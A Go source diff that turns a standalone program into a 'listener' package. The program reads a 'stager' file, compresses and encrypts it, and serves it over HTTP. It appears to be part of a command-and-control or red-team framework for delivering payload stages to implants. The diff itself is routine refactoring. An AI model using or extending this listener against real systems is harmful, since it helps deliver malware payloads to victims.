@@ -1,4 +1,4 @@
-package main
+package listener
 
 import (
 	"bytes"
@@ -8,7 +8,6 @@ import (
 	"crypto/rand"
 	"encoding/binary"
 	"encoding/hex"
-	"flag"
 	"fmt"
 	"log"
 	"net/http"
@@ -75,8 +74,8 @@ func deriveKeyFromString(str string) []byte {
 	return keyBytes[:16] // Ensure the key is 16 bytes long
 }
 
-// ServeHTTPStager serves the encrypted stager file over HTTP.
-func ServeHTTPStager(stager_enc []byte, port string) {
+// serveStager serves the encrypted stager file over HTTP.
+func serveStager(stager_enc []byte, port string) {
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		log.Printf("Received request from %s", r.RemoteAddr)
 		w.Header().Set("Content-Type", "application/octet-stream")
@@ -88,26 +87,21 @@ func ServeHTTPStager(stager_enc []byte, port string) {
 	http.ListenAndServe(fmt.Sprintf(":%s", port), nil)
 }
 
-func main() {
-	stagerPath := flag.String("stager", "", "path to the stager file to serve")
-	port := flag.String("port", "8080", "port to serve the stager file on")
-	keyStr := flag.String("key", "my_secret_key", "key to encrypt the stager file")
-	flag.Parse()
-
-	if *stagerPath == "" {
-		log.Fatal("stager file path is required")
-	}
-
-	stager, err := os.ReadFile(*stagerPath)
+// HTTPListener reads, compresses, encrypts the stager file and serves it over HTTP.
+// stagerPath: the path to the stager file to serve.
+// port: the port to serve the stager file on.
+// keyStr: the passpharase to encrypt the stager file.
+func HTTPListener(stagerPath string, port string, keyStr string) {
+	stager, err := os.ReadFile(stagerPath)
 	if err != nil {
 		log.Fatalf("Failed to read stager file: %v", err)
 	}
 
-	key := deriveKeyFromString(*keyStr)
+	key := deriveKeyFromString(keyStr)
 
 	compressedStager := compressData(stager)
 	encryptedStager := encryptData(compressedStager, key)
 
-	log.Printf("Serving encrypted stager file on port %s", *port)
-	ServeHTTPStager(encryptedStager, *port)
+	log.Printf("Serving encrypted stager file on port %s", port)
+	serveStager(encryptedStager, port)
 }
